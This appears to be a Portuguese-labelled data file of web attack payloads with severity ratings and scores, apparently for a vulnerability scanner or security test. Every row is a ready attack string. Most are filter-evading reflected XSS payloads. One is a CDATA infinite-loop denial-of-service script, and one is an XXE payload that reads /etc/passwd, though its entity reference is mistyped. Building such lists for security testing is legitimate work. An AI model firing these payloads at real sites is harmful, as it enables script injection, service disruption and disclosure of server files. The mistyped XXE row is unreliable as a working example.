""><STYLE>@import""javascript:alert('XSS')"";</STYLE>|MÉDIO|XSS Refletido - CSS + import JS: Executar alert via CSS injection|4|xss,web,injection
>""'><img%20src%3D%26%23x6a;…alert(%26quot;%20XSS%20Test%20Successful%26quot;)>|MÉDIO|XSS Refletido - URL-Encoding + HTML entity evasion: Executar alert com codificação dupla|4|xss,web,injection
>%22%27><img%20src%3d%22javascript:alert(%27%20XSS%27)%22>|MÉDIO|XSS Refletido - URL-Encoding parcial: Executar alert|4|xss,web,injection
'%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'|MÉDIO|XSS Refletido - Unicode-Escape (UTF-16): Bypass filtros e executar alert|4|xss,web,injection
"""";!--""<XSS>=&{()}|BAIXO|XSS Refletido - Injeção com caracteres especiais: Quebrar parser e injetar <XSS>|1|xss,web,injection
<IMG SRC=""javascript:alert('XSS');"">|MÉDIO|XSS Refletido - Tag IMG com atributo JS: Executar alert|4|xss,web,injection
<script>alert('XSS')</script>|ALTO|XSS Refletido - Tag <script> direta: Executar alert|7|xss,web,injection
%3cscript%3ealert('XSS')%3c/script%3e|ALTO|XSS Refletido - URL-Encoding completa: Executar alert|7|xss,web,injection
<![CDATA[<script>var n=0;while(true){n++;}</script>]]>|ALTO|XSS em XML/HTML - CDATA embedding: Executar loop infinito (DoS)|7|xss,web,injection
<?xml version=""1.0""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><foo>&xee;</foo>|CRÍTICO|XXE - External Entity (Unix passwd): Exfiltrar /etc/passwd|10|xxe,xml,external
